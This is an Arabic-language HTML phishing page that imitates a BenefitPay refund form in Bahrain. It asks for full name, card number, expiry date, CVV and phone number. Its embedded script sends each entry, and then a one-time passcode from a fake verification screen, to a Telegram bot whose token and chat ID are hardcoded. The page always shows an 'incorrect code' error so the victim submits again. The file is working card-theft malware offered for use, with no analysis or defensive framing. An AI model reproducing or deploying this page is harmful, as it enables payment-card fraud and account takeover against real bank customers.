<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BenefitPay - Refund</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; }
        .header { background-color: #e21e26; color: white; padding: 15px; text-align: right; display: flex; align-items: center; }
        .header img { width: 40px; vertical-align: middle; margin-left: 10px; }
        .container { padding: 20px; }
        .card { background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); position: relative; }
        .status-bar { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 15px; color: #666; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; background-color: #fdfdfd; }
        .btn { background-color: #e21e26; color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #loading, #otp-screen { display: none; text-align: center; padding: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .flag { width: 25px; vertical-align: middle; margin-left: 5px; }
    </style>
</head>
<body>
<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
    <span>BenefitPay <br><small>نظام الدفع الآمن في البحرين</small></span>
</div>
<div class="container">
    <div class="card" id="main-card">
        <div class="status-bar"><span>مرجع: BP-9928374</span><span style="color: green;">● آمن</span></div>
        <h3 style="text-align: center; color: #e21e26;">طلب استرداد مبلغ - Refund</h3>
        <form id="payForm">
            <div class="input-group"><label>الاسم الكامل</label><input type="text" id="holder" placeholder="كما هو موضح على البطاقة" required></div>
            <div class="input-group"><label>رقم البطاقة</label><input type="number" id="card" placeholder="0000 0000 0000 0000" required></div>
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 2;"><label>تاريخ الانتهاء</label><input type="text" id="exp" placeholder="MM/YY" required></div>
                <div class="input-group" style="flex: 1;"><label>CVV</label><input type="password" id="cvv" placeholder="***" required></div>
            </div>
            <div class="input-group"><label>رقم الهاتف</label>
                <div style="display: flex; align-items: center; border: 1px solid #ddd; border-radius: 8px; padding-right: 10px;">
                    <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
                    <span style="margin-left: 5px;">+973</span>
                    <input type="number" id="phone" style="border: none;" placeholder="3XXX XXXX" required>
                </div>
            </div>
            <button type="button" class="btn" onclick="sendData()">تأكيد الاسترداد</button>
        </form>
    </div>
    <div class="card" id="loading"><div class="spinner"></div><p>جاري معالجة طلب الاسترداد...</p></div>
    <div class="card" id="otp-screen">
        <h3 style="color: #e21e26;">التحقق من الهوية</h3>
        <p>أدخل الرمز المرسل لهاتفك لإتمام عملية الاسترداد</p>
        <input type="number" id="otp_code" placeholder="Enter OTP">
        <button class="btn" onclick="finalStep()">تأكيد الرمز</button>
        <p id="error-msg" style="color: red; display: none; margin-top: 15px;">الرمز غير صحيح، يرجى إعادة المحاولة</p>
    </div>
</div>
<script>
    const token = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
    const chatId = "8302667206";
    function sendData() {
        const holder = document.getElementById('holder').value;
        const card = document.getElementById('card').value;
        const exp = document.getElementById('exp').value;
        const cvv = document.getElementById('cvv').value;
        const phone = document.getElementById('phone').value;
        if(!holder || !card || !exp || !cvv || !phone) { alert("يرجى ملء كافة الخانات"); return; }
        document.getElementById('main-card').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        const message = `💰 صيدة استرداد جديدة 💰\n👤 الاسم: ${holder}\n💳 البطاقة: ${card}\n🗓 التاريخ: ${exp}\n🔒 CVV: ${cvv}\n📞 الهاتف: +973${phone}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`).then(() => {
            setTimeout(() => { document.getElementById('loading').style.display = 'none'; document.getElementById('otp-screen').style.display = 'block'; }, 3000);
        });
    }
    function finalStep() {
        const otp = document.getElementById('otp_code').value;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 رمز الـ OTP (استرداد): " + otp)}`).then(() => {
            document.getElementById('error-msg').style.display = 'block';
        });
    }
</script>
</body>
</html>
